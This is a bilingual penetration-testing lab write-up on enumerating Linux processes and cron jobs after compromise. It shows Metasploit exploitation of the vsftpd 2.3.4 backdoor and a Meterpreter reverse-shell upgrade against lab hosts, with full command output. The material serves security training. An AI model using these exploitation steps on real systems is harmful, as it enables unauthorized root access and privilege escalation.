---
layout: post
title: "Enumerating Processes & Cron Jobs"
date: "2023-06-15"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Linux Local Enumeration
## Enumerating Processes & Cron Jobs
After gaining initial access to a target system, it is always important to learn more about the system like, what processes, services and scheduled tasks are currently running.

What are we looking for?
* Running services
* Cron Jobs

## Demo: Enumerating Processes & Cron Jobs

# Linux 本地枚举
## 枚举进程和 Cron 作业
在成功访问目标系统后，了解系统更多信息是非常重要的，例如当前正在运行哪些进程、服务和计划任务。

我们要寻找什么？

* 正在运行的服务
* Cron 作业

## 演示：枚举进程和 Cron 作业
Firstly, we're going to be enumerating or identifying the running services on the Linux system. And the objective there is to identify the services that are running as well as their respective process ids. And, we'll also be taking a look at how to enumerate the Cron jobs that have been configured to run on the Linux system. So a Cron job is the Linux alternative or the Linux implementation of scheduled tasks on Windows, or Cron job is a task that has been configured to run on a specified schedule. Cron jobs are not just limited to specified commands or scripts, you can also set up a Cron job to execute a specific command, a specific binary. And in most cases, Cron jobs are set up to execute a specific bash script or a Python script at a specified schedule. So you can configure a Cron job to run every minute. You can configure it to run every day, every month. So inregards to the schedule that a Cron job can be configured to run on or with the options are endless. And the reason we're trying to enumerate the Cron jobs that have been configured to run is primarily down to privilege escalation. But we're going to be trying and to identify Cron jobs that have been misconfigured or are configurd insecurely. And we'll be exploring how we can utilize those Cron jobs to elevate our privileges.

Kali Linux : 192.183.4.2

Target IP Address : 192.183.4.3

```
msfconsole
setg RHOSTS 192.183.4.3
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
exploit
```

```
sessions
sessions -u 1
sessions
sessions 2
```

We have our Meterpreter session. We can enumerate the list of running processes with Meterpreter by typing in `ps`.

`ps`: List running processes.

`ps`：列出正在运行的进程。

`suspend`: Suspends or resumes a list of processes.

`suspend`：挂起或恢复一组进程。

`pgrep`: Filter processes by name.

`pgrep`：按名称过滤进程。

`kill`: Terminate a process.

`kill`：终止一个进程。

```
meterpreter > ps
```

That will display the process list.

We can also filter the processes by name.

```
meterpreter > pgrep vsftpd
```

```
meterpreter > shell
/bin/bash -i
```

To do this manually, we can also utilize the Linux utility called `ps`. That will list out the list of processes.

```
ps
ps aux
```

I'm currently running within msfconsole. And I can run the `ps` command on my Kali Linux system, just to explain how this works.

```
ps
```

That will list out a list of processes. And it'll sort it based on the process id, the TTY session, the Time, and then the command that is being executed.

```
ps aux
```

I can also utilize the `ps aux` command to display all processes and to also display information that is important to us.

We can also limit or filter the processes that we want to see based on specific parameters.

For example, If I say `ps aux`, I can pipe out the output and utilize `grep` to filter through and only display information that we want. If I wanted to list out a specific process like msfconsole. It's going to display the processes based on the keyword that I specified here.

```
ps aux | grep msfconsole
```

If I wanted to limit the output to a specific user or to only display processes associated with a specific user.

```
ps aux | grep root
```

This will show me all processes that belong to the root user right over here.

Another utility that you can utilize is the `top` command. That is the top command, which will display a list of processes.

```
top
```

`top` utility will give you a list of all running processes.

The other piece of information that we wanted to enumerate are Cron jobs.

We can display the Cron jobs for a specific user or the user that you have access to or with on the target system.

```
crontab -l
```

This will display the list of Cron jobs for the root user. No Cron jobs have been configured by the root user or for the root user for that matter.

We can also display the contents of the `/etc` directory, but we're looking for all files whth cron in the file name. So we can use the asterisk command as a wildcard.

```
ls -al /etc/cron*
```

This will display all cron files.

```
cat /etc/cron*
```

# Enumerating Processes & Cron Jobs
## Overview
Goal

This lab covers the process enumerating services and cron jobs running on a target system running Linux.

# 枚举进程和 Cron 作业
## 概述
目标

本实验涵盖在运行 Linux 的目标系统上运行的枚举服务和 cron 作业的过程。

## 复现视频内容
Kali Linux : 192.192.62.2

Target IP Address : 192.192.62.3

```
root@attackdefense:~# service postgresql start && msfconsole -q
[ ok ] Starting PostgreSQL 11 database server: main.
msf5 > setg RHOSTS 192.192.62.3
RHOSTS => 192.192.62.3
msf5 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.192.62.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.192.62.3:21 - USER: 331 Please specify the password.
[+] 192.192.62.3:21 - Backdoor service has been spawned, handling...
[+] 192.192.62.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.192.62.2:33815 -> 192.192.62.3:6200) at 2023-06-15 02:03:02 +0000

^Z
Background session 1? [y/N]  y
```

```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.192.62.2:33815 -> 192.192.62.3:6200 (192.192.62.3)

msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.192.62.2:4433 
[*] Sending stage (985320 bytes) to 192.192.62.3
[*] Meterpreter session 2 opened (192.192.62.2:4433 -> 192.192.62.3:35626) at 2023-06-15 02:04:39 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > 
[*] Stopping exploit/multi/handler

msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions

Active sessions
===============

  Id  Name  Type                   Information  Connection
  --  ----  ----                   -----------  ----------
  1         shell cmd/unix                      192.192.62.2:33815 -> 192.192.62.3:6200 (192.192.62.3)
  2         meterpreter x86/linux               192.192.62.2:4433 -> 192.192.62.3:35626 (192.192.62.3)

msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions 2
[*] Starting interaction with 2...

meterpreter > 
```

```
meterpreter > ps

Process List
============

 PID  PPID  Name    Arch    User  Path
 ---  ----  ----    ----    ----  ----
 1    0     sh      x86     root  /bin
 7    1     vsftpd  x86     root  /usr/local/sbin
 8    7     sh      x86     root  /bin
 35   8     SXuDt   x86_64  root  /tmp
```

```
meterpreter > pgrep vsftpd
7
```

```
meterpreter > shell
Process 39 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:~/vsftpd-2.3.4# ps
ps
bash: ps: command not found
root@victim-1:~/vsftpd-2.3.4# ps aux
ps aux
bash: ps: command not found
```

```
root@attackdefense:~# ps
    PID TTY          TIME CMD
     21 pts/0    00:00:00 bash
     76 pts/0    00:00:15 ruby
    385 pts/0    00:00:00 ps
```

```
root@attackdefense:~# ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2384   760 ?        Ss   01:57   0:00 /bin/sh /startup.sh
root          19  0.1  0.0 105924 21296 ?        Sl   01:57   0:01 /usr/local/bin/ttyd -p 45654 bash
root          21  0.0  0.0   3812  3176 pts/0    Ss   01:58   0:00 bash
postgres      41  0.0  0.0 214220 27112 ?        S    02:02   0:00 /usr/lib/postgresql/11/bin/postgres -D /var/lib/postgresql/11/main -c config_file=/etc/po
postgres      43  0.0  0.0 214356  8860 ?        Ss   02:02   0:00 postgres: 11/main: checkpointer   
postgres      44  0.0  0.0 214360  5772 ?        Ss   02:02   0:00 postgres: 11/main: background writer   
postgres      45  0.0  0.0 214220  9684 ?        Ss   02:02   0:00 postgres: 11/main: walwriter   
postgres      46  0.0  0.0 214648  6516 ?        Ss   02:02   0:00 postgres: 11/main: autovacuum launcher   
postgres      47  0.0  0.0  69408  5056 ?        Ss   02:02   0:00 postgres: 11/main: stats collector   
postgres      48  0.0  0.0 214648  6716 ?        Ss   02:02   0:00 postgres: 11/main: logical replication launcher   
root          76  2.1  0.2 1136368 281296 pts/0  Tl   02:02   0:15 ruby /usr/bin/msfconsole -q
postgres      83  0.0  0.0 216660 20556 ?        Ss   02:02   0:00 postgres: 11/main: msf msf 127.0.0.1(58368) idle
postgres      90  0.0  0.0 216216 19244 ?        Ss   02:02   0:00 postgres: 11/main: msf msf 127.0.0.1(37782) idle
postgres     160  0.0  0.0 216692 21096 ?        Ss   02:04   0:00 postgres: 11/main: msf msf 127.0.0.1(57736) idle
postgres     164  0.0  0.0 216408 20516 ?        Ss   02:04   0:00 postgres: 11/main: msf msf 127.0.0.1(57740) idle
postgres     172  0.0  0.0 216148 18284 ?        Ss   02:05   0:00 postgres: 11/main: msf msf 127.0.0.1(37948) idle
root         388  0.0  0.0   7636  2748 pts/0    R+   02:14   0:00 ps aux
```

```
root@attackdefense:~# ps aux | grep msfconsole
root          76  1.2  0.2 1136368 281296 pts/0  Tl   02:02   0:15 ruby /usr/bin/msfconsole -q
root         407  0.0  0.0   3096   940 pts/0    S+   02:22   0:00 grep msfconsole
```

```
root@attackdefense:~# ps aux | grep root
root           1  0.0  0.0   2384   760 ?        Ss   01:57   0:00 /bin/sh /startup.sh
root          19  0.1  0.0 105924 21296 ?        Sl   01:57   0:02 /usr/local/bin/ttyd -p 45654 bash
root          21  0.0  0.0   3812  3176 pts/0    Ss   01:58   0:00 bash
root          76  1.1  0.2 1136368 281296 pts/0  Tl   02:02   0:15 ruby /usr/bin/msfconsole -q
root         411  0.0  0.0   7636  2772 pts/0    R+   02:24   0:00 ps aux
root         412  0.0  0.0   3096   936 pts/0    S+   02:24   0:00 grep root
```

```
root@attackdefense:~# top
```

```
top - 02:25:34 up 272 days, 17:53,  0 users,  load average: 0.12, 0.11, 0.14
Tasks:  17 total,   1 running,  15 sleeping,   1 stopped,   0 zombie
%Cpu(s):  0.0 us,  0.0 sy,  0.0 ni, 99.9 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
MiB Mem :  96566.3 total,   8560.0 free,   3914.8 used,  84091.5 buff/cache
MiB Swap:    512.0 total,    442.5 free,     69.5 used.  91675.4 avail Mem 

    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                                                                              
     19 root      20   0  105924  21296   4076 S   0.3   0.0   0:02.49 ttyd                                                                                 
      1 root      20   0    2384    760    696 S   0.0   0.0   0:00.02 startup.sh                                                                           
     21 root      20   0    3812   3176   2764 S   0.0   0.0   0:00.01 bash                                                                                 
     41 postgres  20   0  214220  27112  25176 S   0.0   0.0   0:00.05 postgres                                                                             
     43 postgres  20   0  214356   8860   6868 S   0.0   0.0   0:00.02 postgres                                                                             
     44 postgres  20   0  214360   5772   3824 S   0.0   0.0   0:00.03 postgres                                                                             
     45 postgres  20   0  214220   9684   7748 S   0.0   0.0   0:00.11 postgres                                                                             
     46 postgres  20   0  214648   6516   4348 S   0.0   0.0   0:00.02 postgres                                                                             
     47 postgres  20   0   69408   5056   2984 S   0.0   0.0   0:00.14 postgres                                                                             
     48 postgres  20   0  214648   6716   4576 S   0.0   0.0   0:00.00 postgres                                                                             
     76 root      20   0 1136368 281296  14164 T   0.0   0.3   0:15.61 ruby                                                                                 
     83 postgres  20   0  216660  20556  16456 S   0.0   0.0   0:00.15 postgres                                                                             
     90 postgres  20   0  216216  19244  15728 S   0.0   0.0   0:00.57 postgres                                                                             
    160 postgres  20   0  216692  21096  16852 S   0.0   0.0   0:00.08 postgres                                                                             
    164 postgres  20   0  216408  20516  16660 S   0.0   0.0   0:00.11 postgres                                                                             
    172 postgres  20   0  216148  18284  15100 S   0.0   0.0   0:00.04 postgres                                                                             
    415 root      20   0    8048   3156   2712 R   0.0   0.0   0:00.00 top
```

```
root@attackdefense:~# crontab -l
no crontab for root
```

```
root@attackdefense:~# ls -al /etc/cron*
-rw-r--r-- 1 root root 1042 Mar 12  2018 /etc/crontab

/etc/cron.d:
total 28
drwxr-xr-x 1 root root 4096 Apr 24  2019 .
drwxr-xr-x 1 root root 4096 Jun 15 01:57 ..
-rw-r--r-- 1 root root  102 Oct  3  2017 .placeholder
-rw-r--r-- 1 root root  469 Jan  7  2019 geoipupdate
-rw-r--r-- 1 root root  607 Jan 15  2019 john
-rw-r--r-- 1 root root  712 Dec 17  2018 php
-rw-r--r-- 1 root root  396 Apr  6  2019 sysstat

/etc/cron.daily:
total 72
drwxr-xr-x 1 root root 4096 Apr 24  2019 .
drwxr-xr-x 1 root root 4096 Jun 15 01:57 ..
-rw-r--r-- 1 root root  102 Oct  3  2017 .placeholder
-rwxr-xr-x 1 root root  539 Nov  3  2018 apache2
-rwxr-xr-x 1 root root 1478 Jan 18  2018 apt-compat
-rwxr-xr-x 1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x 1 root root 2185 Mar  1  2019 chkrootkit
-rwxr-xr-x 1 root root  157 Dec 13  2017 debtags
-rwxr-xr-x 1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x 1 root root 4128 Aug 25  2018 exim4-base
-rwxr-xr-x 1 root root  377 Aug 21  2018 logrotate
-rwxr-xr-x 1 root root 1123 Feb 10  2019 man-db
-rwxr-xr-x 1 root root  543 Nov 14  2018 mlocate
-rwxr-xr-x 1 root root 1403 Mar 21  2019 ntp
-rwxr-xr-x 1 root root  249 Sep 27  2017 passwd
-rwxr-xr-x 1 root root  383 Mar 30  2019 samba
-rwxr-xr-x 1 root root  441 Apr  6  2019 sysstat

/etc/cron.hourly:
total 12
drwxr-xr-x 1 root root 4096 Jun  1  2018 .
drwxr-xr-x 1 root root 4096 Jun 15 01:57 ..
-rw-r--r-- 1 root root  102 Oct  3  2017 .placeholder

/etc/cron.monthly:
total 16
drwxr-xr-x 1 root root 4096 Apr 24  2019 .
drwxr-xr-x 1 root root 4096 Jun 15 01:57 ..
-rw-r--r-- 1 root root  102 Oct  3  2017 .placeholder
-rwxr-xr-x 1 root root  144 Jun  5  2013 rwhod

/etc/cron.weekly:
total 16
drwxr-xr-x 1 root root 4096 Apr 24  2019 .
drwxr-xr-x 1 root root 4096 Jun 15 01:57 ..
-rw-r--r-- 1 root root  102 Oct  3  2017 .placeholder
-rwxr-xr-x 1 root root  813 Feb 10  2019 man-db
```
